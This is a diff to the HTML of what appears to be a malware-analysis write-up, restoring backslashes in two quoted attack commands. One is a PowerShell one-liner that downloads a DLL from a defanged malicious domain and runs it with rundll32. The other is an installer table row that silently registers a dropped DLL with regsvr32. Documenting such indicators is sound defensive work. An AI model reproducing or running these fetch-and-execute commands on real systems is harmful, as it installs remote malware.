@@ -640,7 +640,7 @@ It downloads a DLL from a remote location and executes it.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit iwr -Uri
 hxxps://news-wellness[.]com/5MVhfo8BnDub/D.png -OutFile
-$env:TEMPtest.dll;Start-Process rundll32.exe $env:TEMPtest.dll,jhbvygftr&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+$env:TEMP\test.dll;Start-Process rundll32.exe $env:TEMP\test.dll,jhbvygftr&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -5954,7 +5954,7 @@ AI_PREPARE_UPGRADE 65 aicustact.dll PrepareUpgrade
 AI_ResolveKnownFolders 1 aicustact.dll AI_ResolveKnownFolders
 AI_RESTORE_LOCATION 65 aicustact.dll RestoreLocation
 AI_STORE_LOCATION 51 ARPINSTALLLOCATION [APPDIR]
-LaunchFile 1026 viewer.exe C:WindowsSystem32regsvr32.exe /S [LocalAppDataFolder]sharepointMenuEx.dll
+LaunchFile 1026 viewer.exe C:\Windows\System32\regsvr32.exe /S [LocalAppDataFolder]sharepointMenuEx.dll
 SET_SHORTCUTDIR 307 SHORTCUTDIR [ProgramMenuFolder][ProductName]
 SET_TARGETDIR_TO_APPDIR 51 TARGETDIR [APPDIR]
 AI_CORRECT_INSTALL 51 AI_INSTALL {}
